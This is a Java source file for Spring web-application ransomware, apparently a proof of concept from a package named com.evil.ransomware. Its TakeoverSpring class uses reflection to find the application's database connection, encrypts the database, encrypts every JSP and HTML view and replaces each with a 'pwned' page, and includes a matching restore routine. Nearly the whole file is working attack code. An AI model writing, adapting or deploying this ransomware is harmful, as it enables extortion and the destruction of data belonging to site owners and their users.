package com.evil.ransomware;

import org.springframework.beans.factory.NoSuchBeanDefinitionException;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Configurable;
import org.springframework.beans.factory.config.AutowireCapableBeanFactory;
import org.springframework.context.annotation.ComponentScan;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.util.FileCopyUtils;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.support.SpringBeanAutowiringSupport;

import javax.sql.DataSource;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.List;
import java.util.Vector;
import java.util.stream.Collectors;

@Configurable
@ComponentScan(basePackages = "com.evil.ransomware")
public class TakeoverSpring {

    @Autowired
    private WebApplicationContext ctx;

    @Autowired
    private AutowireCapableBeanFactory beanFactory;

    private JdbcTemplate jdbc;

    public TakeoverSpring() {
        SpringBeanAutowiringSupport.processInjectionBasedOnCurrentContext(this);

        jdbc = null;
        try {
            jdbc = getSpringJdbc();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void restore() {
        System.out.println("restoring!");

        try {
            restoreJsp();
            restoreDatabase(jdbc);
        } catch (Exception e) {
            // Crap!
            System.out.println(e);
            e.printStackTrace();
            return;
        }

    }

    public void takeOver() {
        System.out.println("taking over!");

//        System.out.println("doing this theeeeeng!: " + beanFactory);
//        System.out.println("class : " + beanFactory.getClass());
//        BeanDefinition beanDefinition = new RootBeanDefinition(TestController.class, Autowire.BY_TYPE.value(), true);
//        DefaultListableBeanFactory registry = (DefaultListableBeanFactory) beanFactory;
//        registry.registerBeanDefinition("testController", beanDefinition);
//        for ( String key : ctx.getServletContext().getServletRegistrations().keySet()) {
//            System.out.println("servelet registration: " + key);
//            // modify the handler to include a new mapping
//        }
//        ServletRegistration reg =  ctx.getServletContext().getServletRegistration("SpringDispatcher");
//        System.out.println("reg class: " + reg.getClass());
//        reg.addMapping("/foobar");
//        for ( String map : reg.getMappings()) {
//            System.out.println("mapping: " + map);
//        }

        try {
            takeOverDatabase(jdbc);
            takeOverJsp();
        } catch (Exception e) {
            // Crap!
            System.out.println(e);
            e.printStackTrace();
            return;
        }
    }

    private void takeOverJsp() throws Exception {
        File f = new File(TakeoverSpring.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
        // /Users/caleb/Downloads/apache-tomcat-9.0.0.M3/webapps/SpringMvcJdbcTemplate/WEB-INF/lib/ransomware-1.0-SNAPSHOT.jar
        System.out.println("location: " + f);
        String path = f.getPath();
        int indx = path.indexOf("/WEB-INF/lib/");
        path = path.substring(0, indx + 9) + "views";

        List<File> filesInFolder = getFilesFromPath(path);

        for (File view : filesInFolder) {
            if (view.getName().toLowerCase().endsWith(".jsp")) {
                Cryptor.encrypt(view.getPath());
                moveResource("pwned.jsp", view.getPath());
            } else if (view.getName().toLowerCase().endsWith(".html")) {
                Cryptor.encrypt(view.getPath());
                moveResource("pwned.html", view.getPath());
            }
        }

    }

	private void restoreJsp() throws Exception {
        File f = new File(TakeoverSpring.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
        String path = f.getPath();
        int indx = path.indexOf("/WEB-INF/lib/");
        path = path.substring(0, indx + 9) + "views";

      List<File> filesInFolder = getFilesFromPath(path);

      // get resources from the jar
        for (File view : filesInFolder) {
					if (view.getName().toLowerCase().endsWith(".jsp.enc")) {
						Cryptor.decrypt(view.getPath());
					} else if (view.getName().toLowerCase().endsWith(".html.enc")) {
						Cryptor.decrypt(view.getPath());
					}

        }
    }

    private List<File> getFilesFromPath(String path)  throws Exception{
        List<File> filesInFolder = Files.walk(Paths.get(path))
                .filter(Files::isRegularFile)
                .map(Path::toFile)
                .collect(Collectors.toList());

        return filesInFolder;
    }

    private void moveResource(String filename, String path) throws IOException {
        ClassLoader classLoader = getClass().getClassLoader();
        InputStream in = classLoader.getResourceAsStream(filename);
        BufferedReader reader = new BufferedReader(new InputStreamReader(in));

        FileOutputStream outStream = new FileOutputStream(path);
        System.out.println("copying " + in + " to " + path);
        FileCopyUtils.copy(in, outStream);
    }

    private static void restoreDatabase(JdbcTemplate jdbc) throws Exception {
        DBRotator dbr = new DBRotator(jdbc.getDataSource().getConnection());
        dbr.decryptDatabase("dbransom");
    }

    private static void takeOverDatabase(JdbcTemplate jdbc) throws Exception {
        DBRotator dbr = new DBRotator(jdbc.getDataSource().getConnection());
        dbr.encryptDatabase("dbransom");
    }

    private JdbcTemplate getSpringJdbc() throws NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, InstantiationException {
        DataSource ds = null;
        try {
            // Should work for most cases where dataSource is defined in XML beans
            ds = (DataSource) ctx.getBean("dataSource");

            return new JdbcTemplate(ds);
        } catch (NoSuchBeanDefinitionException e) {

        }

        for (Class<?> klazz : loadedClasses()) {
            if (klazz.getName().startsWith("java") || klazz.getName().startsWith("org.springframework")) {
                continue;
            }

            Method[] methods = null;
            try {
                methods = klazz.getMethods();
            } catch (Throwable e) {
                // I really don't care.
                continue;
            }

            for (Method m : methods) {
                if (m.getReturnType() != DataSource.class) {
                    continue;
                }

                if (m.getParameterTypes().length != 0) {
                    continue;
                }

                //System.out.println("THIS METHOD LOOKS GOOD: " + m);
                m.setAccessible(true);
                for (Constructor ctor : klazz.getDeclaredConstructors()) {
                    if (ctor.getGenericParameterTypes().length == 0) {
                        ctor.setAccessible(true);
                        Object instance = ctor.newInstance();
                        SpringBeanAutowiringSupport.processInjectionBasedOnCurrentContext(instance);
                        beanFactory.autowireBean(instance);
                        ds = (DataSource) m.invoke(instance);
                    }
                }

                if (ds != null) {
                    break;
                }
            }
        }

        return ds == null ? null : new JdbcTemplate(ds);
    }

    private static Class<?>[] loadedClasses() throws NoSuchFieldException, IllegalAccessException {
        ClassLoader cl = TakeoverSpring.class.getClassLoader();
        Class<?> klazz = cl.getClass();
        while (klazz != ClassLoader.class) {
            klazz = klazz.getSuperclass();
        }

        java.lang.reflect.Field classesField = klazz.getDeclaredField("classes");
        classesField.setAccessible(true);
        Vector<Class<?>> v = (Vector<Class<?>>) classesField.get(cl);

        return v.toArray(new Class<?>[v.size()]);
    }

}
